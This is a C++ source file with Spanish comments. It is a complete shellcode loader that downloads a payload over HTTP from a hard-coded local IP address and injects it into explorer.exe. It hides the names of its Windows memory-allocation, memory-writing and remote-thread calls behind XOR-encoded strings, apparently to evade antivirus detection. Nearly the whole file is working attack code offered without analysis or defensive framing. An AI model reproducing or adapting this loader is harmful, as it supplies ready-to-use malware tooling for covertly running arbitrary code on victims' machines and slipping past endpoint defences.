#include <windows.h>
#include <tlhelp32.h>
#include <winhttp.h>
#include <iostream>
#include <vector>

#pragma comment(lib, "winhttp.lib")

typedef LPVOID(WINAPI* VAExType)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
typedef BOOL(WINAPI* WPMType)(HANDLE  hProcess, LPVOID  lpBaseAddress, LPCVOID lpBuffer, SIZE_T  nSize, SIZE_T* lpNumberOfBytesWritten);
typedef HANDLE(WINAPI* CRTType)(HANDLE hProcess, LPSECURITY_ATTRIBUTES  lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, DWORD lpThreadId);

void XOR(unsigned char* data, size_t data_len, const char* key, size_t key_len) {
    int j = 0;
    for (size_t i = 0; i < data_len; i++) {
        if (j == key_len) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

LPCSTR DAndP(unsigned char* encoded, size_t len, const char* key, size_t key_len) {
    char* decoded = new char[len + 1];
    memcpy(decoded, encoded, len);
    XOR(reinterpret_cast<unsigned char*>(decoded), len, key, key_len);
    decoded[len] = '\0';
    return decoded;
}

// Función para descargar el shellcode desde un servidor
std::vector<BYTE> DownloadShellcode(LPCWSTR serverName, LPCWSTR objectName) {
    HINTERNET hSession = WinHttpOpen(L"A WinHTTP Example Program/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return {};

    HINTERNET hConnect = WinHttpConnect(hSession, serverName, INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return {};
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", objectName, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return {};
    }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) || !WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return {};
    }

    std::vector<BYTE> buffer;
    DWORD dwSize = 0, dwDownloaded = 0;
    do {
        WinHttpQueryDataAvailable(hRequest, &dwSize);
        if (dwSize > 0) {
            std::vector<BYTE> tempBuffer(dwSize);
            WinHttpReadData(hRequest, tempBuffer.data(), dwSize, &dwDownloaded);
            buffer.insert(buffer.end(), tempBuffer.begin(), tempBuffer.begin() + dwDownloaded);
        }
    } while (dwSize > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}

// Función para obtener el handle del proceso por nombre
HANDLE GetProcessHandleByName(const std::wstring& processName) {
    HANDLE hProcess = nullptr;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return nullptr;

    if (Process32FirstW(snapshot, &pe32)) {
        do {
            if (processName == pe32.szExeFile) {
                hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
                break;
            }
        } while (Process32NextW(snapshot, &pe32));
    }

    CloseHandle(snapshot);
    return hProcess;
}

int main(int argc, char* argv[]) {
    HANDLE hThread;  // Remote thread handle
    HMODULE library = NULL;
    LPVOID my_sc_mem;  // Pointer to remote buffer for payload
    VAExType pVAEx;
    WPMType pWPM;
    CRTType pCRT;

    const char* key = "offensivepanda";
    size_t k_len = strlen(key);

    // Nombre del proceso donde inyectar el shellcode
    std::wstring pName = L"explorer.exe";
    HANDLE hProcess = GetProcessHandleByName(pName);

    // Descarga del shellcode desde el servidor
    std::wstring serverName = L"192.168.2.138";
    std::wstring objectName = L"/test.bin";  // Ruta del shellcode en el servidor
    std::vector<BYTE> shellcode = DownloadShellcode(serverName.c_str(), objectName.c_str());

    if (shellcode.empty()) {
        std::cerr << "Error al descargar el shellcode.\n";
        return 1;
    }

    SIZE_T sc_len = shellcode.size();

    library = GetModuleHandle(L"kernel32.dll");
    unsigned char sVAEx[] = { 0x39, 0x0f, 0x14, 0x11, 0x1b, 0x12, 0x05, 0x37, 0x09, 0x1c, 0x0e, 0x0d, 0x21, 0x19 };
    unsigned char sWPM[] = { 0x38, 0x14, 0x0f, 0x11, 0x0b, 0x23, 0x1b, 0x19, 0x06, 0x15, 0x12, 0x1d, 0x29, 0x04, 0x02, 0x09, 0x14, 0x1c };
    unsigned char sCRT[] = { 0x2c, 0x14, 0x03, 0x04, 0x1a, 0x16, 0x3b, 0x13, 0x08, 0x1f, 0x15, 0x0b, 0x30, 0x09, 0x1d, 0x03, 0x07, 0x01 };
    LPCSTR A = DAndP(sVAEx, sizeof(sVAEx), key, k_len);
    LPCSTR B = DAndP(sWPM, sizeof(sWPM), key, k_len);
    LPCSTR C = DAndP(sCRT, sizeof(sCRT), key, k_len);
    pVAEx = (VAExType)GetProcAddress(library, (LPCSTR)A);
    pWPM = (WPMType)GetProcAddress(library, (LPCSTR)B);
    pCRT = (CRTType)GetProcAddress(library, (LPCSTR)C);

    if (hProcess) {
        std::wcout << L"Handle to " << pName << ": " << hProcess << std::endl;

        // Asignar memoria en el proceso remoto
        my_sc_mem = pVAEx(hProcess, 0, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        // Copiar el shellcode descargado en la memoria asignada
        pWPM(hProcess, my_sc_mem, shellcode.data(), sc_len, NULL);

        // Crear un hilo remoto para ejecutar el shellcode
        hThread = pCRT(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)my_sc_mem, NULL, 0, NULL);
        if (hThread != NULL) {
            WaitForSingleObject(hThread, 500);
            CloseHandle(hThread);
        }

        CloseHandle(hProcess);  // Cerrar el handle del proceso al terminar
    } else {
        std::cerr << "Failed to obtain process handle.\n";
    }

    return 0;
}
